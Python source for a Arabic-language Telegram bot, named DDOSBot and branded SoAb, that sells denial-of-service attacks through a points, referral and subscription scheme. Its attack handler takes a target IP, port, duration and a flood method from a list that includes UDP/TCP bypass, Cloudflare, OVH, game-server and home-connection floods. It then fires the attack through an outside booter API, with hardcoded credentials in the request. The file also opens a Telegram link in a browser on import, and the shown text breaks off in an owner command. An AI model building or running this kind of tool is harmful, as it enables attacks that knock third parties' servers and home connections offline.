import webbrowser
webbrowser.open('https://t.me/X_I_I_1')
import json
import os
import time
import threading
import re
import requests
import sqlite3
from datetime import datetime, timedelta
from telebot import TeleBot, types
import logging
import sys

#
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot_errors.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class DDOSBot:
    def __init__(self, bot_token, db_file='bot_data.db'):
        self.bot = TeleBot(bot_token)
        self.db_file = db_file
        self.active_attacks = {}
        self.user_cooldowns = {}
        self.MAX_CONCURRENT_ATTACKS = 4
        self.USER_COOLDOWN_SECONDS = 20
        self.MAX_ATTACK_TIME = 160
        self.running = True
        self.attack_counter = 0
        self._db_lock = threading.Lock()

        self.init_db()
        self.register_handlers()

    def get_conn(self):
        conn = sqlite3.connect(self.db_file, check_same_thread=False)
        conn.row_factory = sqlite3.Row
        return conn

    def init_db(self):
        try:
            with self._db_lock:
                conn = self.get_conn()
                c = conn.cursor()
                c.execute('''CREATE TABLE IF NOT EXISTS config (
                    key TEXT PRIMARY KEY,
                    value TEXT NOT NULL
                )''')
                c.execute('''CREATE TABLE IF NOT EXISTS users (
                    user_id TEXT PRIMARY KEY,
                    points INTEGER DEFAULT 0,
                    referrer TEXT,
                    join_date TEXT,
                    last_renewal TEXT,
                    invites INTEGER DEFAULT 0,
                    expiry_date TEXT
                )''')
                try:
                    c.execute("ALTER TABLE users ADD COLUMN expiry_date TEXT")
                except Exception:
                    pass
                c.execute('''CREATE TABLE IF NOT EXISTS protected_targets (
                    target TEXT PRIMARY KEY
                )''')
                c.execute('''CREATE TABLE IF NOT EXISTS channels (
                    channel TEXT PRIMARY KEY
                )''')
                c.execute("INSERT OR IGNORE INTO config VALUES ('owners', ?)",
                          (json.dumps(["8206337665"]),))
                c.execute("INSERT OR IGNORE INTO config VALUES ('admins', ?)",
                          (json.dumps([]),))
                conn.commit()
                conn.close()
        except Exception as e:
            logger.error(f"خطأ في تهيئة قاعدة البيانات: {e}")

    def _get_config(self, key, default=None):
        try:
            with self._db_lock:
                conn = self.get_conn()
                c = conn.cursor()
                c.execute("SELECT value FROM config WHERE key=?", (key,))
                row = c.fetchone()
                conn.close()
                if row:
                    return json.loads(row['value'])
                return default
        except Exception as e:
            logger.error(f"خطأ _get_config({key}): {e}")
            return default

    def _set_config(self, key, value):
        try:
            with self._db_lock:
                conn = self.get_conn()
                c = conn.cursor()
                c.execute("INSERT OR REPLACE INTO config VALUES (?, ?)",
                          (key, json.dumps(value)))
                conn.commit()
                conn.close()
        except Exception as e:
            logger.error(f"خطأ _set_config({key}): {e}")

    def get_owners(self):
        return self._get_config('owners', ["ايدي"])

    def get_admins(self):
        return self._get_config('admins', [])

    def get_all_data(self):
        return {"owners": self.get_owners(), "admins": self.get_admins()}

    def save_admins_data(self, data):
        self._set_config('owners', data.get('owners', []))
        self._set_config('admins', data.get('admins', []))

    def add_admin_id(self, user_id):
        admins = self.get_admins()
        if str(user_id) not in admins:
            admins.append(str(user_id))
            self._set_config('admins', admins)

    def remove_admin_id(self, user_id):
        admins = self.get_admins()
        if str(user_id) in admins:
            admins.remove(str(user_id))
            self._set_config('admins', admins)

    def add_owner_id(self, user_id):
        owners = self.get_owners()
        if str(user_id) not in owners:
            owners.append(str(user_id))
            self._set_config('owners', owners)

    def remove_owner_id(self, user_id):
        owners = self.get_owners()
        if str(user_id) in owners:
            owners.remove(str(user_id))
            self._set_config('owners', owners)

    def get_users(self):
        try:
            with self._db_lock:
                conn = self.get_conn()
                c = conn.cursor()
                c.execute("SELECT * FROM users")
                rows = c.fetchall()
                conn.close()
                result = {}
                for row in rows:
                    result[row['user_id']] = {
                        "points": row['points'],
                        "referrer": row['referrer'],
                        "join_date": row['join_date'],
                        "last_renewal": row['last_renewal'],
                        "invites": row['invites'],
                        "expiry_date": row['expiry_date'] if 'expiry_date' in row.keys() else None,
                    }
                return result
        except Exception as e:
            logger.error(f"خطأ get_users: {e}")
            return {}

    def save_users(self, users_data):
        try:
            with self._db_lock:
                conn = self.get_conn()
                c = conn.cursor()
                for uid, data in users_data.items():
                    if isinstance(data, dict):
                        c.execute('''INSERT OR REPLACE INTO users
                            (user_id, points, referrer, join_date, last_renewal, invites, expiry_date)
                            VALUES (?,?,?,?,?,?,?)''',
                            (str(uid),
                             data.get('points', 0),
                             data.get('referrer'),
                             data.get('join_date'),
                             data.get('last_renewal'),
                             data.get('invites', 0),
                             data.get('expiry_date')))
                conn.commit()
                conn.close()
        except Exception as e:
            logger.error(f"خطأ save_users: {e}")

    def get_user_data(self, user_id):
        try:
            with self._db_lock:
                conn = self.get_conn()
                c = conn.cursor()
                c.execute("SELECT * FROM users WHERE user_id=?", (str(user_id),))
                row = c.fetchone()
                conn.close()
                if row:
                    return {
                        "points": row['points'],
                        "referrer": row['referrer'],
                        "join_date": row['join_date'],
                        "last_renewal": row['last_renewal'],
                        "invites": row['invites'],
                        "expiry_date": row['expiry_date'] if 'expiry_date' in row.keys() else None,
                    }
                return None
        except Exception as e:
            logger.error(f"خطأ get_user_data: {e}")
            return None

    def save_user_data(self, user_id, data):
        try:
            with self._db_lock:
                conn = self.get_conn()
                c = conn.cursor()
                c.execute('''INSERT OR REPLACE INTO users
                    (user_id, points, referrer, join_date, last_renewal, invites, expiry_date)
                    VALUES (?,?,?,?,?,?,?)''',
                    (str(user_id),
                     data.get('points', 0),
                     data.get('referrer'),
                     data.get('join_date'),
                     data.get('last_renewal'),
                     data.get('invites', 0),
                     data.get('expiry_date')))
                conn.commit()
                conn.close()
        except Exception as e:
            logger.error(f"خطأ save_user_data: {e}")

    def get_user_points(self, user_id):
        d = self.get_user_data(user_id)
        return d.get("points", 0) if d else 0

    def add_points(self, user_id, n, max_points=50):
        d = self.get_user_data(user_id)
        if d:
            d["points"] = min(d.get("points", 0) + n, max_points)
            self.save_user_data(user_id, d)
            return d["points"]
        return 0

    def add_points_unlimited(self, user_id, n):
        d = self.get_user_data(user_id)
        if d:
            d["points"] = d.get("points", 0) + n
            self.save_user_data(user_id, d)
            return d["points"]
        return 0

    def reset_user_points(self, user_id):
        d = self.get_user_data(user_id)
        if d:
            d["points"] = 0
            self.save_user_data(user_id, d)
            return True
        return False

    def deduct_points(self, user_id, n=1):
        d = self.get_user_data(user_id)
        if d and d.get("points", 0) >= n:
            d["points"] -= n
            self.save_user_data(user_id, d)
            return True
        return False

    def auto_register(self, user_id, referrer_id=None):
        uid = str(user_id)
        if self.get_user_data(uid):
            return False
        today = datetime.now().strftime("%Y-%m-%d")
        self.save_user_data(uid, {
            "points": 6,
            "referrer": str(referrer_id) if referrer_id else None,
            "join_date": today,
            "last_renewal": today,
            "invites": 0
        })
        if referrer_id:
            ref = self.get_user_data(referrer_id)
            if ref:
                ref["invites"] = ref.get("invites", 0) + 1
                self.save_user_data(referrer_id, ref)
                self.add_points(referrer_id, 5)
        return True

    def delete_user(self, user_id):
        try:
            with self._db_lock:
                conn = self.get_conn()
                c = conn.cursor()
                c.execute("DELETE FROM users WHERE user_id=?", (str(user_id),))
                conn.commit()
                conn.close()
                return True
        except Exception as e:
            logger.error(f"خطأ delete_user: {e}")
            return False

    def get_protected_targets(self):
        try:
            with self._db_lock:
                conn = self.get_conn()
                c = conn.cursor()
                c.execute("SELECT target FROM protected_targets")
                rows = c.fetchall()
                conn.close()
                return [row['target'] for row in rows]
        except Exception as e:
            logger.error(f"خطأ get_protected_targets: {e}")
            return []

    def save_protected_targets(self, targets):
        try:
            with self._db_lock:
                conn = self.get_conn()
                c = conn.cursor()
                c.execute("DELETE FROM protected_targets")
                for t in targets:
                    c.execute("INSERT OR IGNORE INTO protected_targets VALUES (?)", (t,))
                conn.commit()
                conn.close()
        except Exception as e:
            logger.error(f"خطأ save_protected_targets: {e}")

    def get_channels(self):
        try:
            with self._db_lock:
                conn = self.get_conn()
                c = conn.cursor()
                c.execute("SELECT channel FROM channels")
                rows = c.fetchall()
                conn.close()
                return [row['channel'] for row in rows]
        except Exception as e:
            logger.error(f"خطأ get_channels: {e}")
            return []

    def save_channels(self, channels):
        try:
            with self._db_lock:
                conn = self.get_conn()
                c = conn.cursor()
                c.execute("DELETE FROM channels")
                for ch in channels:
                    c.execute("INSERT OR IGNORE INTO channels VALUES (?)", (ch,))
                conn.commit()
                conn.close()
        except Exception as e:
            logger.error(f"خطأ save_channels: {e}")

    def check_user_subscription(self, user_id):
        channels = self.get_channels()
        if not channels:
            return True, []
        not_joined = []
        for ch in channels:
            try:
                member = self.bot.get_chat_member(ch, user_id)
                if member.status in ['left', 'kicked', 'banned']:
                    not_joined.append(ch)
            except Exception:
                not_joined.append(ch)
        return len(not_joined) == 0, not_joined

    def is_owner(self, user_id):
        try:
            return str(user_id) in self.get_owners()
        except:
            return False

    def is_admin(self, user_id):
        try:
            return str(user_id) in self.get_admins() or self.is_owner(user_id)
        except:
            return False

    def is_subscribed(self, user_id):
        try:
            d = self.get_user_data(str(user_id))
            if not d:
                return False
            if d.get("points", 0) > 0:
                return True
            exp = d.get("expiry_date")
            if exp:
                return datetime.strptime(exp, "%Y-%m-%d %H:%M:%S") > datetime.now()
            return False
        except:
            return False

    def has_active_days(self, user_id):
        try:
            d = self.get_user_data(str(user_id))
            if not d:
                return False
            exp = d.get("expiry_date")
            if exp:
                return datetime.strptime(exp, "%Y-%m-%d %H:%M:%S") > datetime.now()
            return False
        except:
            return False

    def add_days_to_user(self, user_id, days):
        today = datetime.now().strftime("%Y-%m-%d")
        d = self.get_user_data(str(user_id))
        if not d:
            d = {"points": 0, "referrer": None, "join_date": today,
                 "last_renewal": today, "invites": 0, "expiry_date": None}
        exp = d.get("expiry_date")
        if exp:
            try:
                base = datetime.strptime(exp, "%Y-%m-%d %H:%M:%S")
                if base < datetime.now():
                    base = datetime.now()
            except:
                base = datetime.now()
        else:
            base = datetime.now()
        new_expiry = base + timedelta(days=days)
        d["expiry_date"] = new_expiry.strftime("%Y-%m-%d %H:%M:%S")
        self.save_user_data(str(user_id), d)
        return d["expiry_date"]

    def add_user_subscription(self, user_id, days):
        try:
            expiry_date = datetime.now() + timedelta(days=days)
            expiry_str = expiry_date.strftime('%Y-%m-%d %H:%M:%S')
            today = datetime.now().strftime("%Y-%m-%d")
            d = self.get_user_data(user_id)
            if not d:
                self.save_user_data(user_id, {
                    "points": days,
                    "referrer": None,
                    "join_date": today,
                    "last_renewal": today,
                    "invites": 0
                })
            else:
                d["points"] = d.get("points", 0) + days
                self.save_user_data(user_id, d)
            return expiry_str
        except Exception as e:
            logger.error(f"خطأ في إضافة اشتراك مستخدم: {e}")
            return None

    def notify_all_users(self, text):
        users = self.get_users()
        for uid in users.keys():
            try:
                self.bot.send_message(int(uid), text)
            except:
                pass

    def daily_renewal(self):
        while self.running:
            try:
                users = self.get_users()
                today = datetime.now().strftime("%Y-%m-%d")
                renewed = 0
                for uid, data in users.items():
                    if isinstance(data, dict):
                        last = data.get("last_renewal", "")
                        if last != today:
                            data["points"] = data.get("points", 0) + 6
                            data["last_renewal"] = today
                            self.save_user_data(uid, data)
                            renewed += 1
                            try:
                                new_pts = data["points"]
                                self.bot.send_message(int(uid),
                                    "[ SoAb ]\n\n"
                                    "تم تجديد نقاطك اليومية\n"
                                    f"رصيدك الحالي : {new_pts} نقطة"
                                )
                            except:
                                pass
                if renewed > 0:
                    logger.info(f"تم التجديد اليومي للنقاط — {renewed} عضو")
            except Exception as e:
                logger.error(f"خطأ في التجديد اليومي: {e}")
            
            time.sleep(3600)

    def process_add_admin(self, message):
        try:
            new_admin = int(message.text)
            if self.is_admin(new_admin):
                self.bot.reply_to(message, " هذا المستخدم هو أدمن بالفعل!")
            else:
                self.add_admin_id(new_admin)
                self.bot.reply_to(message, f" تم رفع `{new_admin}` إلى رتبة أدمن بنجاح.", parse_mode="Markdown")
        except ValueError:
            self.bot.reply_to(message, " آيدي غير صحيح. الرجاء إرسال أرقام فقط.")
        except Exception as e:
            logger.error(f"خطأ في process_add_admin: {e}")
            self.bot.reply_to(message, " حدث خطأ أثناء معالجة الطلب.")

    def process_remove_admin(self, message):
        try:
            admin_id = int(message.text)
            if self.is_owner(admin_id):
                self.bot.reply_to(message, " لا يمكنك حذف مطور من قائمة الأدمنية.")
            elif self.is_admin(admin_id):
                self.remove_admin_id(admin_id)
                self.bot.reply_to(message, f" تم حذف `{admin_id}` من قائمة الأدمنية.", parse_mode="Markdown")
            else:
                self.bot.reply_to(message, " هذا المستخدم ليس أدمن أصلاً.")
        except ValueError:
            self.bot.reply_to(message, " آيدي غير صحيح.")
        except Exception as e:
            logger.error(f"خطأ في process_remove_admin: {e}")
            self.bot.reply_to(message, " حدث خطأ أثناء معالجة الطلب.")

    def process_add_owner(self, message):
        try:
            new_owner = int(message.text)
            if self.is_owner(new_owner):
                self.bot.reply_to(message, " هذا المستخدم هو مطور بالفعل!")
            else:
                self.add_owner_id(new_owner)
                self.bot.reply_to(message, f" تم رفع `{new_owner}` إلى رتبة مطور بنجاح!", parse_mode="Markdown")
        except ValueError:
            self.bot.reply_to(message, " آيدي غير صحيح.")
        except Exception as e:
            logger.error(f"خطأ في process_add_owner: {e}")
            self.bot.reply_to(message, " حدث خطأ أثناء معالجة الطلب.")

    def process_remove_owner(self, message):
        try:
            owner_id = int(message.text)
            if owner_id == message.from_user.id:
                self.bot.reply_to(message, " لا يمكنك حذف نفسك!")
            elif self.is_owner(owner_id):
                self.remove_owner_id(owner_id)
                self.bot.reply_to(message, f" تم حذف `{owner_id}` من قائمة المطورين.", parse_mode="Markdown")
            else:
                self.bot.reply_to(message, " هذا المستخدم ليس مطوراً.")
        except ValueError:
            self.bot.reply_to(message, " آيدي غير صحيح.")
        except Exception as e:
            logger.error(f"خطأ في process_remove_owner: {e}")
            self.bot.reply_to(message, " حدث خطأ أثناء معالجة الطلب.")

    def process_add_user(self, message):
        try:
            parts = message.text.split()
            if len(parts) != 2:
                self.bot.reply_to(message, "صيغة غير صحيحة. مثال:\n123456789 20")
                return
            user_id = int(parts[0])
            points = int(parts[1])
            uid = str(user_id)
            d = self.get_user_data(uid)
            if d:
                d["points"] = d.get("points", 0) + points
                self.save_user_data(uid, d)
                new_pts = d["points"]
            else:
                today = datetime.now().strftime("%Y-%m-%d")
                self.save_user_data(uid, {"points": points, "referrer": None, "join_date": today, "last_renewal": today, "invites": 0})
                new_pts = points

            try:
                self.bot.send_message(user_id,
                    "[ SoAb ]\n\n"
                    f"تم اضافة {points} نقطة لحسابك من المطور\n"
                    f"رصيدك الحالي : {new_pts} نقطة"
                )
            except:
                pass

            self.bot.reply_to(message,
                f"[ تم اضافة النقاط ]\n\n"
                f"الآيدي  : {user_id}\n"
                f"النقاط  : +{points}\n"
                f"الرصيد  : {new_pts}"
            )
        except ValueError:
            self.bot.reply_to(message, "آيدي أو نقاط غير صحيحة.")
        except Exception as e:
            logger.error(f"خطأ في process_add_user: {e}")
            self.bot.reply_to(message, f"حدث خطأ: {str(e)}")

    def process_add_days(self, message):
        try:
            parts = message.text.split()
            if len(parts) != 2:
                self.bot.reply_to(message, "صيغة غير صحيحة. مثال:\n123456789 30")
                return
            user_id = int(parts[0])
            days = int(parts[1])
            if days <= 0:
                self.bot.reply_to(message, "عدد الايام يجب ان يكون اكبر من 0")
                return
            new_expiry = self.add_days_to_user(str(user_id), days)
            try:
                self.bot.send_message(user_id,
                    "[ SoAb ]\n\n"
                    f"تم اضافة {days} يوم لاشتراكك من المطور\n"
                    f"اشتراكك فعال حتى : {new_expiry[:10]}"
                )
            except:
                pass
            self.bot.reply_to(message,
                f"[ تم اضافة الايام ]\n\n"
                f"الآيدي   : {user_id}\n"
                f"الايام   : +{days}\n"
                f"ينتهي    : {new_expiry[:10]}"
            )
        except ValueError:
            self.bot.reply_to(message, "آيدي أو ايام غير صحيحة.")
        except Exception as e:
            logger.error(f"خطأ في process_add_days: {e}")
            self.bot.reply_to(message, f"حدث خطأ: {str(e)}")

    def process_and_run_attack(self, message):
        try:
            chat_id = message.chat.id
            user_id = str(message.from_user.id)
            username = message.from_user.username
            username = f"@{username}" if username else "لا يوجد يوزر"

            if not self.is_admin(message.from_user.id):
                subscribed, not_joined = self.check_user_subscription(message.from_user.id)
                if not subscribed:
                    sub_mk = types.InlineKeyboardMarkup()
                    for ch in not_joined:
                        link = f"https://t.me/{ch.lstrip('@')}"
                        sub_mk.row(types.InlineKeyboardButton(f"اشترك في {ch}", url=link))
                    sub_mk.row(types.InlineKeyboardButton("تحقق من الاشتراك", callback_data="cmd_check_sub"))
                    self.bot.reply_to(message,
                        "[ اشتراك اجباري ]\n\n"
                        "يجب الاشتراك في القنوات التالية :\n\n" +
                        "\n".join(not_joined),
                        reply_markup=sub_mk
                    )
                    return

            current_time = time.time()
            active_attacks_now = {k: v for k, v in self.active_attacks.items() if current_time < v['end_time']}
            active_count = len(active_attacks_now)
            if active_count >= self.MAX_CONCURRENT_ATTACKS and not self.is_admin(message.from_user.id):
                soonest = min((v['end_time'] for v in active_attacks_now.values()), default=0)
                wait_secs = max(0, int(soonest - current_time)) + 1
                self.bot.reply_to(message,
                    "<blockquote>"
                    "[ السيرفر مشغول ]\n\n"
                    f"يوجد {active_count} هجمات نشطة الآن\n"
                    f"الحد الأقصى : {self.MAX_CONCURRENT_ATTACKS} هجمات\n\n"
                    f"انتظر تقريباً {wait_secs} ثانية ثم حاول مجدداً"
                    "</blockquote>",
                    parse_mode="HTML"
                )
                return

            if not self.is_admin(message.from_user.id):
                last_attack = self.user_cooldowns.get(user_id, 0)
                elapsed = current_time - last_attack
                if elapsed < self.USER_COOLDOWN_SECONDS:
                    wait = int(self.USER_COOLDOWN_SECONDS - elapsed)
                    sent = self.bot.reply_to(message,
                        f"<blockquote>انتظار\n\n{wait} ثانية</blockquote>",
                        parse_mode="HTML"
                    )
                    def _countdown(msg_obj, seconds):
                        for remaining in range(seconds - 1, 0, -1):
                            time.sleep(1)
                            try:
                                self.bot.edit_message_text(
                                    f"<blockquote>انتظار\n\n{remaining} ثانية</blockquote>",
                                    msg_obj.chat.id,
                                    msg_obj.message_id,
                                    parse_mode="HTML"
                                )
                            except:
                                break
                    threading.Thread(target=_countdown, args=(sent, wait), daemon=True).start()
                    return

            if not self.is_admin(message.from_user.id):
                pts = self.get_user_points(user_id)
                if pts < 6:
                    self.bot.reply_to(message,
                        "[ نقاط غير كافية ]\n\n"
                        f"رصيدك : {pts} نقطة\n"
                        "سعر الهجوم : 6 نقاط\n"
                        "ادعُ اصدقاء للحصول على نقاط\n"
                        "التجديد اليومي : 12 نقطة\n\n"
                        "رابطك : /invite"
                    )
                    return

            parts = message.text.split()

            if len(parts) != 4:
                self.bot.reply_to(message, " صيغة الأمر خاطئة. يجب أن تكون:\n`METHOD HOST PORT TIME`", parse_mode="Markdown")
                return

            method, host, port_str, time_str = parts

            VALID_METHODS = [
                "Dns","Udpmix","Pps","Gre-udp","Ack","Tcpmix","Tls","Http","Cloudflare","Browser",
                "Hudp","Udp-pps","Udpbypass","Vse","Tcpbypass","Socket","Game","Dayz","Fort",
                "Fivem","Fivem-udp","Tcp-ovh","Udp-ovh","Flooder","Mass-flood","Browserv2",
                "Bypass","Overload","Home-udp","Home-tcp",
            ]
            method_lower = method.lower()
            matched = next((m for m in VALID_METHODS if m.lower() == method_lower), None)
            if not matched:
                self.bot.reply_to(message,
                    f"<blockquote>الطريقة {method} غير مدعومة!</blockquote>",
                    parse_mode="HTML")
                return
            method = matched

            try:
                port = int(port_str)
                attack_time = int(time_str)
                if not (1 <= port <= 65535 and attack_time > 0):
                    raise ValueError
            except ValueError:
                self.bot.reply_to(message, " البورت أو الوقت غير صحيح. تأكد أن البورت بين 1-65535 والوقت أكبر من صفر.")
                return

            if attack_time > self.MAX_ATTACK_TIME:
                self.bot.reply_to(message,
                    f" مدة الهجوم لا يمكن أن تتجاوز {self.MAX_ATTACK_TIME} ثانية.\n"
                    f"الوقت المدخل : {attack_time} ثانية"
                )
                return

            username_api = "majram12"
            key = "fgasdasd"

            attack_url = (f"http://mirakuru.pro/api/attack?"
                          f"username={username_api}&"
                          f"key={key}&"
                          f"host={host}&"
                          f"port={port}&"
                          f"time={attack_time}&"
                          f"method={method}")

            import uuid
            attack_id = f"attack_{int(time.time())}_{uuid.uuid4().hex[:6]}"

            is_admin_user = self.is_admin(message.from_user.id)

            attack_data = {
                'host': host, 'port': port, 'time': attack_time, 'method': method,
                'attack_url': attack_url, 'chat_id': chat_id, 'user_id': user_id,
                'username': username, 'start_time': time.time(), 'end_time': time.time() + attack_time,
                'is_admin': is_admin_user,
            }

            if not is_admin_user:
                self.user_cooldowns[user_id] = time.time()

            self.active_attacks[attack_id] = attack_data

            thread = threading.Thread(target=self.execute_attack, args=(attack_id,))
            thread.daemon = True
            thread.start()
        except Exception as e:
            logger.error(f"خطأ في process_and_run_attack: {e}")
            try:
                self.bot.reply_to(message, " حدث خطأ أثناء بدء الهجوم.")
            except:
                pass

    def execute_attack(self, attack_id):
        try:
            attack_data = self.active_attacks.get(attack_id)
            if not attack_data:
                return

            chat_id = attack_data['chat_id']

            try:
                response = requests.get(attack_data['attack_url'], timeout=10)
                attack_confirmed = response.status_code == 200

                if not attack_data.get('is_admin'):
                    uid_atk = str(attack_data['user_id'])
                    if attack_confirmed:
                        if not self.has_active_days(uid_atk):
                            self.deduct_points(uid_atk, 6)

                self.attack_counter += 1
                atk_num = self.attack_counter

                uid_atk = str(attack_data.get('user_id', ''))
                d_atk = self.get_user_data(uid_atk) or {}
                exp_atk = d_atk.get("expiry_date")
                active_days = False
                if exp_atk:
                    try:
                        active_days = datetime.strptime(exp_atk, "%Y-%m-%d %H:%M:%S") > datetime.now()
                    except:
                        pass

                if active_days:
                    sub_line = f"اشتراكك  : فعال حتى {exp_atk[:10]}"
                else:
                    remaining_pts = self.get_user_points(uid_atk)
                    sub_line = f"نقاطك    : {remaining_pts}"

                start_msg = (
                    "<blockquote>"
                    f"[ هجمة #{atk_num} ]\n\n"
                    f"الهدف    : {attack_data['host']}:{attack_data['port']}\n"
                    f"الطريقة  : {attack_data['method']}\n"
                    f"المدة    : {attack_data['time']} ثانية\n\n"
                    f"{sub_line}"
                    "</blockquote>"
                )
                self.bot.send_message(chat_id, start_msg, parse_mode="HTML")

                time.sleep(attack_data['time'])

            except requests.exceptions.RequestException as e:
                self.bot.send_message(chat_id, "<blockquote>خطأ في الاتصال بالـ API</blockquote>", parse_mode="HTML")
            except Exception as e:
                logger.error(f"خطأ أثناء الهجوم {attack_id}: {e}")
                self.bot.send_message(chat_id, "<blockquote>حدث خطأ اثناء الهجوم</blockquote>", parse_mode="HTML")
        except Exception as e:
            logger.error(f"خطأ في execute_attack: {e}")
        finally:
            if attack_id in self.active_attacks:
                del self.active_attacks[attack_id]

    def register_handlers(self):
        @self.bot.message_handler(commands=['start', 'help'])
        def send_welcome(message):
            try:
                uid = str(message.from_user.id)
                args = message.text.split()
                referrer_id = None
                if len(args) > 1 and args[1].startswith("ref_"):
                    try:
                        referrer_id = int(args[1][4:])
                        if referrer_id == message.from_user.id:
                            referrer_id = None
                    except:
                        referrer_id = None

                is_new = self.auto_register(uid, referrer_id)

                if is_new:
                    try:
                        user = message.from_user
                        full_name = (user.first_name or "") + (" " + user.last_name if user.last_name else "")
                        username = f"@{user.username}" if user.username else "—"
                        join_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        total_members = len(self.get_users())
                        notif = (
                            "<blockquote>"
                            " عضو جديد دخل البوت\n\n"
                            f"الاسم          : {full_name}\n"
                            f"اليوزر         : {username}\n"
                            f"الـ ID          : {user.id}\n"
                            f"وقت الدخول     : {join_time}\n"
                            f"إجمالي الأعضاء : {total_members}"
                            "</blockquote>"
                        )
                        for owner_id in self.get_owners():
                            try:
                                self.bot.send_message(owner_id, notif, parse_mode="HTML")
                            except:
                                pass
                    except Exception as e:
                        logger.error(f"خطأ في إرسال تنبيه العضو الجديد: {e}")

                if self.is_owner(message.from_user.id):
                    owner_markup = types.InlineKeyboardMarkup()
                    owner_markup.row(
                        types.InlineKeyboardButton("الهجمات النشطة", callback_data="cmd_active", style="primary"),
                        types.InlineKeyboardButton("الطرق المتاحة", callback_data="cmd_methods", style="primary"),
                    )
                    owner_markup.row(
                        types.InlineKeyboardButton("اضافة ادمن", callback_data="cmd_add_admin", style="success"),
                        types.InlineKeyboardButton("ازالة ادمن", callback_data="cmd_remove_admin", style="danger"),
                    )
                    owner_markup.row(
                        types.InlineKeyboardButton("قائمة الادمنية", callback_data="cmd_list_admins", style="primary"),
                    )
                    owner_markup.row(
                        types.InlineKeyboardButton("اضافة مطور", callback_data="cmd_add_owner", style="success"),
                        types.InlineKeyboardButton("ازالة مطور", callback_data="cmd_remove_owner", style="danger"),
                    )
                    owner_markup.row(
                        types.InlineKeyboardButton("قائمة المطورين", callback_data="cmd_list_owners", style="primary"),
                    )
                    owner_markup.row(
                        types.InlineKeyboardButton("اضافة نقاط لمشترك", callback_data="cmd_add_user", style="success"),
                        types.InlineKeyboardButton("اضافة ايام لمشترك", callback_data="cmd_add_days", style="success"),
                    )
                    owner_markup.row(
                        types.InlineKeyboardButton("قائمة المشتركين", callback_data="cmd_list_users", style="primary"),
                    )
                    owner_markup.row(
                        types.InlineKeyboardButton("نقاط لكل الاعضاء", callback_data="cmd_bulk_add", style="success"),
                        types.InlineKeyboardButton("راست نقاط عضو", callback_data="cmd_reset_user_pts", style="danger"),
                    )
                    owner_markup.row(
                        types.InlineKeyboardButton("حماية هدف", callback_data="cmd_dad", style="primary"),
                        types.InlineKeyboardButton("ازالة حماية", callback_data="cmd_add", style="danger"),
                    )
                    owner_markup.row(
                        types.InlineKeyboardButton("ازالة مشترك", callback_data="cmd_remove_user", style="danger"),
                    )
                    owner_markup.row(
                        types.InlineKeyboardButton("الاشتراك الاجباري", callback_data="cmd_channels", style="primary"),
                    )
                    owner_markup.row(
                        types.InlineKeyboardButton("الإحصائيات", callback_data="cmd_stats", style="primary"),
                    )
                    owner_markup.row(
                        types.InlineKeyboardButton(" إذاعة رسالة", callback_data="cmd_broadcast", style="primary"),
                    )
                    self.bot.reply_to(message, "اختر الامر:", reply_markup=owner_markup)
                elif self.is_admin(message.from_user.id):
                    admin_markup = types.InlineKeyboardMarkup()
                    admin_markup.row(
                        types.InlineKeyboardButton("الهجمات النشطة", callback_data="cmd_active", style="primary"),
                        types.InlineKeyboardButton("الطرق المتاحة", callback_data="cmd_methods", style="primary"),
                    )
                    self.bot.reply_to(message, "اختر الامر:", reply_markup=admin_markup)
                else:
                    subscribed, not_joined = self.check_user_subscription(message.from_user.id)
                    if not subscribed:
                        sub_mk = types.InlineKeyboardMarkup()
                        for ch in not_joined:
                            link = f"https://t.me/{ch.lstrip('@')}"
                            sub_mk.row(types.InlineKeyboardButton(f"اشترك في {ch}", url=link))
                        sub_mk.row(types.InlineKeyboardButton("تحقق من الاشتراك", callback_data="cmd_check_sub"))
                        self.bot.reply_to(message,
                            "[ اشتراك اجباري ]\n\n"
                            "يجب الاشتراك في القنوات التالية للاستخدام :\n\n" +
                            "\n".join(not_joined),
                            reply_markup=sub_mk
                        )
                        return
                    me = self.bot.get_me()
                    bot_username = me.username
                    invite_link = f"https://t.me/{bot_username}?start=ref_{uid}"
                    share_url = f"https://t.me/share/url?url={invite_link}&text=انضم+معي+في+بوت+SoAb"
                    pts = self.get_user_points(uid)
                    if is_new:
                        welcome_msg = (
                            "<blockquote>[ SoAb ] — عضو</blockquote>\n\n"
                            f"نقاطك        : {pts}\n"
                            "سعر الهجوم   : 6 نقاط\n"
                            "دعوة عضو     : 5 نقاط\n"
                            "تجديد يومي   : 12 نقطة\n\n"
                            "الصيغة :\n"
                            "<code>METHOD IP PORT TIME</code>"
                        )
                    else:
                        welcome_msg = (
                            "<blockquote>[ SoAb ] — عضو</blockquote>\n\n"
                            f"نقاطك        : {pts}\n\n"
                            "الصيغة :\n"
                            "<code>METHOD IP PORT TIME</code>"
                        )
                    user_markup = types.InlineKeyboardMarkup()
                    user_markup.row(
                        types.InlineKeyboardButton("الهجمات النشطة", callback_data="cmd_active", style="primary"),
                        types.InlineKeyboardButton("الطرق المتاحة", callback_data="cmd_methods", style="primary"),
                    )
                    user_markup.row(
                        types.InlineKeyboardButton("مشاركة رابط الدعوة", url=share_url, style="success"),
                        types.InlineKeyboardButton("نسخ رابط الدعوة", callback_data=f"copy_invite_{uid}", style="success"),
                    )
                    user_markup.row(
                        types.InlineKeyboardButton("طريقة الاستعمال", callback_data="cmd_guide", style="primary"),
                    )
                    user_markup.row(
                        types.InlineKeyboardButton("المطور سجين", url="https://t.me/A0_XX", style="primary"),
                    )
                    try:
                        with open("gh.mp4", "rb") as anim:
                            self.bot.send_animation(
                                message.chat.id,
                                anim,
                                caption=welcome_msg,
                                parse_mode="HTML",
                                reply_markup=user_markup
                            )
                    except Exception as img_err:
                        logger.error(f"خطأ إرسال الانيميشن: {img_err}")
                        self.bot.reply_to(message, welcome_msg, parse_mode="HTML", reply_markup=user_markup)
            except Exception as e:
                logger.error(f"خطأ في أمر start: {e}")
                try:
                    self.bot.reply_to(message, " حدث خطأ أثناء معالجة الطلب. الرجاء المحاولة لاحقاً.")
                except:
                    pass

        @self.bot.message_handler(commands=['dad'])
        def protect_target(message):
            try:
                if not self.is_owner(message.from_user.id):
                    self.bot.reply_to(message, " هذا الأمر مخصص للمطورين فقط!")
                    return
                parts = message.text.split()
                if len(parts) != 3:
                    self.bot.reply_to(message, " صيغة الأمر خاطئة. استخدم:\n`/dad IP PORT`", parse_mode="Markdown")
                    return
                _, ip, port = parts
                target = f"{ip}:{port}"
                protected_list = self.get_protected_targets()
                if target in protected_list:
